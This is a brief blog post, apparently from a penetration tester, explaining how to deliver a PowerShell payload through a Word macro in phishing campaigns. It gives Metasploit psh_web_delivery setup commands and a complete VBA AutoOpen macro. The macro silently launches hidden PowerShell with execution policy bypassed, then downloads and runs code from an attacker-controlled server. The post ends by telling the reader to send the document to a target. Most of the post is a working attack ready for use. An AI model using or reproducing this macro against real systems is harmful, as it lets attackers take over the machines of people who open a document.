I have seen quite a few tweets/comments/etc about using Powershell's functionality within the context of a Microsoft Office document/VBA (https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery/blob/master/MacroCode). I am going to share a way I have been leveraging Powershell for payload delivery during phishing engagements for a while now to achieve the same end result in a much simpler fashion. The two stages are as follows:

Attacker Machine:
msf > use exploit/windows/misc/psh_web_delivery
msf exploit(psh_web_delivery) > set SRVHOST Strategic-Sec-Ubuntu-VM-IP
msf exploit(psh_web_delivery) > set URIPATH boom
msf exploit(psh_web_delivery) > exploit

VBA Macro:
Sub AutoOpen()

    Call Shell("powershell.exe -w hidden -nop -ep bypass -c ""IEX ((new-object net.webclient).downloadstring('http://Strategic-Sec-Ubuntu-VM-IP:8080/boom'))""", 1)
End Sub

Save the document as a macro-enabled file.
Send to target, and upon opening....






Meanwhile back at the bat cave...
